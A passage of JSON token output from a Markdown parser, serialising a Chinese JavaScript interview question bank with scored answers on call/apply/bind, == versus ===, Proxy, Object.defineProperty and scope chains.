都是为了解决改变 this 的指向。作⽤都是相同的，只是传参的⽅式不同","text":" call 和apply 都是为了解决改变 this 的指向。作⽤都是相同的，只是传参的⽅式不同","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 除了第⼀个参数外，call 可以接收⼀个参数列表，apply 只接受⼀个参数数组","task":false,"loose":false,"text":"**1：** 除了第⼀个参数外，call 可以接收⼀个参数列表，apply 只接受⼀个参数数组","tokens":[{"type":"text","raw":"**1：** 除了第⼀个参数外，call 可以接收⼀个参数列表，apply 只接受⼀个参数数组","text":"**1：** 除了第⼀个参数外，call 可以接收⼀个参数列表，apply 只接受⼀个参数数组","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 除了第⼀个参数外，call 可以接收⼀个参数列表，apply 只接受⼀个参数数组","text":" 除了第⼀个参数外，call 可以接收⼀个参数列表，apply 只接受⼀个参数数组","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nlet a = { value: 1 }\\nfunction\\n  getValue(name, age) {\\n  console.log(name)\\n  console.log(age)\\n  console.log(this.value)\\n}\\ngetValue.call(a, \'yck\',\'24\')\\ngetValue.apply(a,[\'yck\', \'24\'])\\n```","lang":"js","text":"let a = { value: 1 }\\nfunction\\n  getValue(name, age) {\\n  console.log(name)\\n  console.log(age)\\n  console.log(this.value)\\n}\\ngetValue.call(a, \'yck\',\'24\')\\ngetValue.apply(a,[\'yck\', \'24\'])"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **1：** bind 和其他两个⽅法作⽤也是⼀致的，只是该⽅法会返回⼀个函数。并且我们可以通过 bind 实现柯⾥化","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** bind 和其他两个⽅法作⽤也是⼀致的，只是该⽅法会返回⼀个函数。并且我们可以通过 bind 实现柯⾥化","task":false,"loose":false,"text":"**1：** bind 和其他两个⽅法作⽤也是⼀致的，只是该⽅法会返回⼀个函数。并且我们可以通过 bind 实现柯⾥化","tokens":[{"type":"text","raw":"**1：** bind 和其他两个⽅法作⽤也是⼀致的，只是该⽅法会返回⼀个函数。并且我们可以通过 bind 实现柯⾥化","text":"**1：** bind 和其他两个⽅法作⽤也是⼀致的，只是该⽅法会返回⼀个函数。并且我们可以通过 bind 实现柯⾥化","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" bind 和其他两个⽅法作⽤也是⼀致的，只是该⽅法会返回⼀个函数。并且我们可以通过 bind 实现柯⾥化","text":" bind 和其他两个⽅法作⽤也是⼀致的，只是该⽅法会返回⼀个函数。并且我们可以通过 bind 实现柯⾥化","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"html","block":true,"raw":"</details>\\n\\n","pre":false,"text":"</details>\\n\\n"},{"type":"heading","raw":"## == 和 ===区别，什么情况⽤ ==\\n\\n","depth":2,"text":"== 和 ===区别，什么情况⽤ ==","tokens":[{"type":"text","raw":"== 和 ===区别，什么情况⽤ ==","text":"== 和 ===区别，什么情况⽤ ==","escaped":false}]},{"type":"heading","raw":"#### 类型：基础\\n\\n","depth":4,"text":"类型：基础","tokens":[{"type":"text","raw":"类型：基础","text":"类型：基础","escaped":false}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"list","raw":"- **1：** ===⽤于判断两者类型和值是否相同。在开发中，对于后端返回的 code，可以通过 == 去判断","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** ===⽤于判断两者类型和值是否相同。在开发中，对于后端返回的 code，可以通过 == 去判断","task":false,"loose":false,"text":"**1：** ===⽤于判断两者类型和值是否相同。在开发中，对于后端返回的 code，可以通过 == 去判断","tokens":[{"type":"text","raw":"**1：** ===⽤于判断两者类型和值是否相同。在开发中，对于后端返回的 code，可以通过 == 去判断","text":"**1：** ===⽤于判断两者类型和值是否相同。在开发中，对于后端返回的 code，可以通过 == 去判断","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" ===⽤于判断两者类型和值是否相同。在开发中，对于后端返回的 code，可以通过 == 去判断","text":" ===⽤于判断两者类型和值是否相同。在开发中，对于后端返回的 code，可以通过 == 去判断","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## Proxy 的使用\\n\\n","depth":2,"text":"Proxy 的使用","tokens":[{"type":"text","raw":"Proxy 的使用","text":"Proxy 的使用","escaped":false}]},{"type":"heading","raw":"#### 类型：基础\\n\\n","depth":4,"text":"类型：基础","tokens":[{"type":"text","raw":"类型：基础","text":"类型：基础","escaped":false}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（6 分）\\n\\n","depth":4,"text":"解答（6 分）","tokens":[{"type":"text","raw":"解答（6 分）","text":"解答（6 分）","escaped":false}]},{"type":"html","block":true,"raw":"<details>\\n\\n","pre":false,"text":"<details>\\n\\n"},{"type":"list","raw":"- **4：** 部分 API","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **4：** 部分 API","task":false,"loose":false,"text":"**4：** 部分 API","tokens":[{"type":"text","raw":"**4：** 部分 API","text":"**4：** 部分 API","tokens":[{"type":"strong","raw":"**4：**","text":"4：","tokens":[{"type":"text","raw":"4：","text":"4：","escaped":false}]},{"type":"text","raw":" 部分 API","text":" 部分 API","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"![](https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/3e08a8f141f44148ad6f66c7fdc1ab3e~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp)","text":"![](https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/3e08a8f141f44148ad6f66c7fdc1ab3e~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp)","tokens":[{"type":"image","raw":"![](https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/3e08a8f141f44148ad6f66c7fdc1ab3e~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp)","href":"https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/3e08a8f141f44148ad6f66c7fdc1ab3e~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp","title":null,"text":""}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **1：** 函数调用的监听","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 函数调用的监听","task":false,"loose":false,"text":"**1：** 函数调用的监听","tokens":[{"type":"text","raw":"**1：** 函数调用的监听","text":"**1：** 函数调用的监听","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 函数调用的监听","text":" 函数调用的监听","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nfunction fun() {\\n    console.log(\\"哈哈哈\\");\\n}\\n\\nconst objProxy = new Proxy(fun, {\\n    /**\\n     * 拦截对函数的调用的捕获器\\n     * @param target target new Proxy 所代理的 obj（监听的对象）\\n     * @param thisArg 调用函数时绑定的 this 值\\n     * @param argArray 调用函数时传递的参数列表\\n     */\\n    apply(target, thisArg, argArray) {\\n        console.log(\\"对 fun 函数进行了 apply 的调用。\\");\\n        // 调用原始函数，并在其结果前后添加一些内容\\n        target.apply(thisArg, argArray)\\n    },\\n    /**\\n     * 监听 class 时的捕获器\\n     * @param target target new Proxy 所代理的 obj（监听的对象）\\n     * @param argArray new fun() 时传入的参数，例：new fun(1, 2, ...rest)\\n     * @param newTarget 被调用的构造函数。在这里，newTarget 就是 objProxy 本身，因为 objProxy 是一个函数代理\\n     */\\n    construct(target, argArray, newTarget) {\\n        console.log(\\"对 fun 函数进行了 construct 的调用。\\");\\n        return new target(...argArray)\\n    }\\n});\\n\\nobjProxy.apply();\\nnew objProxy();\\n\\n```","lang":"js","text":"function fun() {\\n    console.log(\\"哈哈哈\\");\\n}\\n\\nconst objProxy = new Proxy(fun, {\\n    /**\\n     * 拦截对函数的调用的捕获器\\n     * @param target target new Proxy 所代理的 obj（监听的对象）\\n     * @param thisArg 调用函数时绑定的 this 值\\n     * @param argArray 调用函数时传递的参数列表\\n     */\\n    apply(target, thisArg, argArray) {\\n        console.log(\\"对 fun 函数进行了 apply 的调用。\\");\\n        // 调用原始函数，并在其结果前后添加一些内容\\n        target.apply(thisArg, argArray)\\n    },\\n    /**\\n     * 监听 class 时的捕获器\\n     * @param target target new Proxy 所代理的 obj（监听的对象）\\n     * @param argArray new fun() 时传入的参数，例：new fun(1, 2, ...rest)\\n     * @param newTarget 被调用的构造函数。在这里，newTarget 就是 objProxy 本身，因为 objProxy 是一个函数代理\\n     */\\n    construct(target, argArray, newTarget) {\\n        console.log(\\"对 fun 函数进行了 construct 的调用。\\");\\n        return new target(...argArray)\\n    }\\n});\\n\\nobjProxy.apply();\\nnew objProxy();\\n"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **1：** new Proxy 中 receiver 参数的作用","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** new Proxy 中 receiver 参数的作用","task":false,"loose":false,"text":"**1：** new Proxy 中 receiver 参数的作用","tokens":[{"type":"text","raw":"**1：** new Proxy 中 receiver 参数的作用","text":"**1：** new Proxy 中 receiver 参数的作用","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" new Proxy 中 receiver 参数的作用","text":" new Proxy 中 receiver 参数的作用","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nconst obj = {\\n    _name: \\"里斯\\",\\n    age: 16,\\n    get name() {\\n        return this._name;\\n    },\\n    set name(newValue) {\\n        this._name = newValue;\\n    }\\n};\\n\\nconst objProxy = new Proxy(obj, {\\n    /**\\n     * receiver 就是 objProxy 这个代理对象\\n     * receiver 传入 Reflect.get 之后，他就作为 obj 里的 this 了（this 这个时候就改变了）\\n     *\\n     */\\n    get(target, key, receiver) {\\n        console.log(receiver);\\n        /**\\n         * 传入 receiver 后，他被访问了两次\\n         */\\n        return Reflect.get(target, key, receiver);\\n    },\\n    set(target, key, newValue, receiver) {\\n        Reflect.set(target, key, newValue, receiver);\\n    }\\n});\\n\\nobjProxy.name = \\"哈哈哈\\";\\nconsole.log(objProxy.name);\\n```","lang":"js","text":"const obj = {\\n    _name: \\"里斯\\",\\n    age: 16,\\n    get name() {\\n        return this._name;\\n    },\\n    set name(newValue) {\\n        this._name = newValue;\\n    }\\n};\\n\\nconst objProxy = new Proxy(obj, {\\n    /**\\n     * receiver 就是 objProxy 这个代理对象\\n     * receiver 传入 Reflect.get 之后，他就作为 obj 里的 this 了（this 这个时候就改变了）\\n     *\\n     */\\n    get(target, key, receiver) {\\n        console.log(receiver);\\n        /**\\n         * 传入 receiver 后，他被访问了两次\\n         */\\n        return Reflect.get(target, key, receiver);\\n    },\\n    set(target, key, newValue, receiver) {\\n        Reflect.set(target, key, newValue, receiver);\\n    }\\n});\\n\\nobjProxy.name = \\"哈哈哈\\";\\nconsole.log(objProxy.name);"},{"type":"space","raw":"\\n\\n"},{"type":"html","block":true,"raw":"</details>\\n\\n","pre":false,"text":"</details>\\n\\n"},{"type":"heading","raw":"## Object.defineProperty 的使用\\n\\n","depth":2,"text":"Object.defineProperty 的使用","tokens":[{"type":"text","raw":"Object.defineProperty 的使用","text":"Object.defineProperty 的使用","escaped":false}]},{"type":"heading","raw":"#### 类型：基础\\n\\n","depth":4,"text":"类型：基础","tokens":[{"type":"text","raw":"类型：基础","text":"类型：基础","escaped":false}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（4 分）\\n\\n","depth":4,"text":"解答（4 分）","tokens":[{"type":"text","raw":"解答（4 分）","text":"解答（4 分）","escaped":false}]},{"type":"html","block":true,"raw":"<details>\\n\\n","pre":false,"text":"<details>\\n\\n"},{"type":"list","raw":"- **1：** Object.defineProperty 的设计初中不是为了监听对象中属性变化的，而是为了定义访问属性描述符。\\n\\n- **1：** 访问属性描述符包括：configurable、enumerable、writable、value\\n\\n- **1：** 访问属性描述符的方法：Object.getOwnPropertyDescriptor()\\n\\n- **1：** 缺点\\n\\n    ① 一次监听太多的时候，不是很友好\\n\\n    ② 新增、删除的时候，他是无能为力的\\n\\n    ③ 会修改原对象中的属性","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- **1：** Object.defineProperty 的设计初中不是为了监听对象中属性变化的，而是为了定义访问属性描述符。\\n\\n","task":false,"loose":true,"text":"**1：** Object.defineProperty 的设计初中不是为了监听对象中属性变化的，而是为了定义访问属性描述符。\\n","tokens":[{"type":"text","raw":"**1：** Object.defineProperty 的设计初中不是为了监听对象中属性变化的，而是为了定义访问属性描述符。\\n","text":"**1：** Object.defineProperty 的设计初中不是为了监听对象中属性变化的，而是为了定义访问属性描述符。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" Object.defineProperty 的设计初中不是为了监听对象中属性变化的，而是为了定义访问属性描述符。","text":" Object.defineProperty 的设计初中不是为了监听对象中属性变化的，而是为了定义访问属性描述符。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 访问属性描述符包括：configurable、enumerable、writable、value\\n\\n","task":false,"loose":true,"text":"**1：** 访问属性描述符包括：configurable、enumerable、writable、value\\n","tokens":[{"type":"text","raw":"**1：** 访问属性描述符包括：configurable、enumerable、writable、value\\n","text":"**1：** 访问属性描述符包括：configurable、enumerable、writable、value","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 访问属性描述符包括：configurable、enumerable、writable、value","text":" 访问属性描述符包括：configurable、enumerable、writable、value","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 访问属性描述符的方法：Object.getOwnPropertyDescriptor()\\n\\n","task":false,"loose":true,"text":"**1：** 访问属性描述符的方法：Object.getOwnPropertyDescriptor()\\n","tokens":[{"type":"text","raw":"**1：** 访问属性描述符的方法：Object.getOwnPropertyDescriptor()\\n","text":"**1：** 访问属性描述符的方法：Object.getOwnPropertyDescriptor()","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 访问属性描述符的方法：Object.getOwnPropertyDescriptor()","text":" 访问属性描述符的方法：Object.getOwnPropertyDescriptor()","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 缺点\\n\\n    ① 一次监听太多的时候，不是很友好\\n\\n    ② 新增、删除的时候，他是无能为力的\\n\\n    ③ 会修改原对象中的属性","task":false,"loose":true,"text":"**1：** 缺点\\n\\n  ① 一次监听太多的时候，不是很友好\\n\\n  ② 新增、删除的时候，他是无能为力的\\n\\n  ③ 会修改原对象中的属性","tokens":[{"type":"text","raw":"**1：** 缺点","text":"**1：** 缺点","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 缺点","text":" 缺点","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"text","raw":"  ① 一次监听太多的时候，不是很友好","text":"  ① 一次监听太多的时候，不是很友好","tokens":[{"type":"text","raw":"  ① 一次监听太多的时候，不是很友好","text":"  ① 一次监听太多的时候，不是很友好","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"text","raw":"  ② 新增、删除的时候，他是无能为力的","text":"  ② 新增、删除的时候，他是无能为力的","tokens":[{"type":"text","raw":"  ② 新增、删除的时候，他是无能为力的","text":"  ② 新增、删除的时候，他是无能为力的","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"text","raw":"  ③ 会修改原对象中的属性","text":"  ③ 会修改原对象中的属性","tokens":[{"type":"text","raw":"  ③ 会修改原对象中的属性","text":"  ③ 会修改原对象中的属性","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nconst obj = {\\n    name: \\"里斯\\",\\n    age: 16\\n};\\n\\n/**\\n * 监听某个属性\\n */\\n/*\\nObject.defineProperty(obj, \\"name\\", {\\n    set(v) {\\n        console.log(v);\\n        console.log(\\"监听到 set\\");\\n    },\\n    get() {\\n        console.log(\\"监听到 get\\");\\n    }\\n});\\n*/\\n\\n/**\\n * 监听所有的属性\\n */\\nObject.keys(obj).forEach(key => {\\n    console.log(key);\\n    let value = obj[key];\\n    Object.defineProperty(obj, key, {\\n        set(v) {\\n            console.log(`监听到属性 ${key}，被 set 为 ${v}`);\\n            value = v;\\n        },\\n        get() {\\n            console.log(`监听到属性 ${key} get`);\\n            return value;\\n        }\\n    });\\n});\\n\\n\\nobj.name = \\"哈哈哈\\";\\n\\nconsole.log(obj.name);\\n```","lang":"js","text":"const obj = {\\n    name: \\"里斯\\",\\n    age: 16\\n};\\n\\n/**\\n * 监听某个属性\\n */\\n/*\\nObject.defineProperty(obj, \\"name\\", {\\n    set(v) {\\n        console.log(v);\\n        console.log(\\"监听到 set\\");\\n    },\\n    get() {\\n        console.log(\\"监听到 get\\");\\n    }\\n});\\n*/\\n\\n/**\\n * 监听所有的属性\\n */\\nObject.keys(obj).forEach(key => {\\n    console.log(key);\\n    let value = obj[key];\\n    Object.defineProperty(obj, key, {\\n        set(v) {\\n            console.log(`监听到属性 ${key}，被 set 为 ${v}`);\\n            value = v;\\n        },\\n        get() {\\n            console.log(`监听到属性 ${key} get`);\\n            return value;\\n        }\\n    });\\n});\\n\\n\\nobj.name = \\"哈哈哈\\";\\n\\nconsole.log(obj.name);"},{"type":"space","raw":"\\n\\n"},{"type":"html","block":true,"raw":"</details>\\n\\n","pre":false,"text":"</details>\\n\\n"},{"type":"heading","raw":"## 作用域链的理解\\n\\n","depth":2,"text":"作用域链的理解","tokens":[{"type":"text","raw":"作用域链的理解","text":"作用域链的理解","escaped":false}]},{"type":"heading","raw":"#### 类型：基础\\n\\n","depth":4,"text":"类型：基础","tokens":[{"type":"text","raw":"类型：基础","text":"类型：基础","escaped":false}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（5 分）\\n\\n","depth":4,"text":"解答（5 分）","tokens":[{"type":"text","raw":"解答（5 分）","text":"解答（5 分）","escaped":false}]},{"type":"paragraph","raw":"注：作用域链是指在 JavaScript 中，当访问一个变量时，JavaScript 引擎会按照一定的顺序在当前作用域以及其上层作用域中查找该变量。这个查找的过程就形成了作用域链。","text":"注：作用域链是指在 JavaScript 中，当访问一个变量时，JavaScript 引擎会按照一定的顺序在当前作用域以及其上层作用域中查找该变量。这个查找的过程就形成了作用域链。","tokens":[{"type":"text","raw":"注：作用域链是指在 JavaScript 中，当访问一个变量时，JavaScript 引擎会按照一定的顺序在当前作用域以及其上层作用域中查找该变量。这个查找的过程就形成了作用域链。","text":"注：作用域链是指在 JavaScript 中，当访问一个变量时，JavaScript 引擎会按照一定的顺序在当前作用域以及其上层作用域中查找该变量。这个查找的过程就形成了作用域链。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"html","block":true,"raw":"<details>\\n\\n","pre":false,"text":"<details>\\n\\n"},{"type":"list","raw":"- **1：** 数据类型","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 数据类型","task":false,"loose":false,"text":"**1：** 数据类型","tokens":[{"type":"text","raw":"**1：** 数据类型","text":"**1：** 数据类型","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 数据类型","text":" 数据类型","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```mermaid\\ngraph TD;\\n\\n    A[作用域链] --> B[作用域];\\n    A --> C[词法作用域];\\n    A --> D[作用域链];\\n```","lang":"mermaid","text":"graph TD;\\n\\n    A[作用域链] --> B[作用域];\\n    A --> C[词法作用域];\\n    A --> D[作用域链];"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **1：** 作用域","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 作用域","task":false,"loose":false,"text":"**1：** 作用域","tokens":[{"type":"text","raw":"**1：** 作用域","text":"**1：** 作用域","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 作用域","text":" 作用域","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"作用域即变量（变量作用域又称上下文）和函数生效（能被访问）的区域或集合。它决定了代码区块中变量和其他资源的可见性。\\n例如：","text":"作用域即变量（变量作用域又称上下文）和函数生效（能被访问）的区域或集合。它决定了代码区块中变量和其他资源的可见性。\\n例如：","tokens":[{"type":"text","raw":"作用域即变量（变量作用域又称上下文）和函数生效（能被访问）的区域或集合。它决定了代码区块中变量和其他资源的可见性。\\n例如：","text":"作用域即变量（变量作用域又称上下文）和函数生效（能被访问）的区域或集合。它决定了代码区块中变量和其他资源的可见性。\\n例如：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\n\\nfunction greet() {\\n  var greeting = \'Hello World!\';\\n  console.log(greeting);\\n}\\ngreet();\\n\\nconsole.log(greeting);// Uncaught ReferenceError: greeting is not defined\\n\\n```","lang":"js","text":"\\nfunction greet() {\\n  var greeting = \'Hello World!\';\\n  console.log(greeting);\\n}\\ngreet();\\n\\nconsole.log(greeting);// Uncaught ReferenceError: greeting is not defined\\n"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **1：** 全局作用域","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 全局作用域","task":false,"loose":false,"text":"**1：** 全局作用域","tokens":[{"type":"text","raw":"**1：** 全局作用域","text":"**1：** 全局作用域","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 全局作用域","text":" 全局作用域","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"任何不在函数中或是大括号中声明的变量，都是在全局作用域下。全局作用域下声明的变量可以在程序的任意位置访问。","text":"任何不在函数中或是大括号中声明的变量，都是在全局作用域下。全局作用域下声明的变量可以在程序的任意位置访问。","tokens":[{"type":"text","raw":"任何不在函数中或是大括号中声明的变量，都是在全局作用域下。全局作用域下声明的变量可以在程序的任意位置访问。","text":"任何不在函数中或是大括号中声明的变量，都是在全局作用域下。全局作用域下声明的变量可以在程序的任意位置访问。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\n// 全局变量\\nvar greeting = \'Hello World!\';\\nfunction greet() {\\n  console.log(greeting);\\n}\\n// 打印 \'Hello World!\'\\ngreet();\\n```","lang":"js","text":"// 全局变量\\nvar greeting = \'Hello World!\';\\nfunction greet() {\\n  console.log(greeting);\\n}\\n// 打印 \'Hello World!\'\\ngreet();"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **1：** 函数作用域","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 函数作用域","task":false,"loose":false,"text":"**1：** 函数作用域","tokens":[{"type":"text","raw":"**1：** 函数作用域","text":"**1：** 函数作用域","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 函数作用域","text":" 函数作用域","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nfunction greet() {\\n  var greeting = \'Hello World!\';\\n  console.log(greeting);\\n}\\n// 打印 \'Hello World!\'\\ngreet();\\n// 报错: Uncaught ReferenceError: greeting is not defined\\nconsole.log(greeting);\\n\\n```","lang":"js","text":"function greet() {\\n  var greeting = \'Hello World!\';\\n  console.log(greeting);\\n}\\n// 打印 \'Hello World!\'\\ngreet();\\n// 报错: Uncaught ReferenceError: greeting is not defined\\nconsole.log(greeting);\\n"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **1：** 块级作用域","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 块级作用域","task":false,"loose":false,"text":"**1：** 块级作用域","tokens":[{"type":"text","raw":"**1：** 块级作用域","text":"**1：** 块级作用域","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 块级作用域","text":" 块级作用域","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"ES6 引入：ES6 引入了let和const关键字，与var关键字不同，在大括号中使用let和const声明的变量存在于块级作用域中。在大括号之外不能访问这些变量。","text":"ES6 引入：ES6 引入了let和const关键字，与var关键字不同，在大括号中使用let和const声明的变量存在于块级作用域中。在大括号之外不能访问这些变量。","tokens":[{"type":"text","raw":"ES6 引入：ES6 引入了let和const关键字，与var关键字不同，在大括号中使用let和const声明的变量存在于块级作用域中。在大括号之外不能访问这些变量。","text":"ES6 引入：ES6 引入了let和const关键字，与var关键字不同，在大括号中使用let和const声明的变量存在于块级作用域中。在大括号之外不能访问这些变量。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\n{\\n  // 块级作用域中的变量\\n  let greeting = \'Hello World!\';\\n  var lang = \'English\';\\n  console.log(greeting); // Prints \'Hello World!\'\\n}\\n// 变量 \'English\'\\nconsole.log(lang);\\n// 报错: Uncaught ReferenceError: greeting is not defined\\nconsole.log(greeting);\\n```","lang":"js","text":"{\\n  // 块级作用域中的变量\\n  let greeting = \'Hello World!\';\\n  var lang = \'English\';\\n  console.log(greeting); // Prints \'Hello World!\'\\n}\\n// 变量 \'English\'\\nconsole.log(lang);\\n// 报错: Uncaught ReferenceError: greeting is not defined\\nconsole.log(greeting);"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **1：** 词法作用域","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 词法作用域","task":false,"loose":false,"text":"**1：** 词法作用域","tokens":[{"type":"text","raw":"**1：** 词法作用域","text":"**1：** 